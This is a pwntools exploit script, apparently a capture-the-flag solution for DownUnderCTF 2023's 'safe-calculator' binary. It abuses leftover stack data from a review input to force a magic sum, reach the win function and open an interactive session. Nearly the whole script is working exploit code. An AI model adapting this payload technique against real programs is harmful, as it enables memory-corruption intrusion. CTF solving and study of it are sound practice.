#!/usr/bin/env python3
from pwn import *

BINARY_PATH = './safe-calculator'
REMOTE_HOST = '2023.ductf.dev'
REMOTE_PORT = 30015

exe = context.binary = ELF(BINARY_PATH)
#  context.log_level = "DEBUG"

#  if args.REMOTE:
    #  libc = ELF("./libc.so.6")
#  else:
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

def do_exploit():
    """
    calculate:
    - reads str addr from "sum" in data ({ arg1: 7664, arg2: 1337})
    - creates local variables from reading the args and sums them
    - if sum is -0x4673a0c8ffffdcd7 we WIN

    leave_review:
    - reads up to 48 chars of ascii

    somehow we would like to get this input data to be ours

    - if we leave a review, the values from that remain when we call calculate again after. So
      scanf("arg: ..", "arg: %d, arg2: %d", "AAAAA", "AAAAA")
    - We control the top word.

    gef➤  x/gx 0x00007fffffffd800
    0x7fffffffd800: 0x4141414100001df0
    gef➤  x/gx 0x00007fffffffd808
    0x7fffffffd808: 0x4141414100000539
    """
    io = start()


    # Chosen values to sum to: 0xb98c5f37
    # b9 = 0x7e + 0x3b
    # 8c = 0x46 + 0x46
    # 5f = 0x3f + 0x20
    # 37 = 0x37 + 0x00
    x1 = b"BBBB" + p32(0x7e463f37)
    y1 = b"CCCC" + p32(0x3b46207e)
    # NOTE: the 7e on y1 is a placeholder we have to clear later, this is because
    # there isn't a way to sum to the 0x37 value in the acceptable ascci range
    # that leave_review allows

    rdx_offset = cyclic_find(0x61616169)
    payload = b"A"*rdx_offset + x1 + y1
    io.sendline(b"2") # review calc
    io.recvuntil(b" : ")
    io.sendline(payload)

    # Trigger the edit but without the second half of y1. This relies on scanf's
    # null terminating string behavior to clear the 7e we don't need above.
    payload = b"A"*rdx_offset + x1 + b"CCCC"
    io.sendline(b"2")
    io.recvuntil(b" : ")
    io.sendline(payload)

    # trigger the win function
    io.sendline(b"1")

    io.interactive()

if __name__ == "__main__":
    do_exploit()
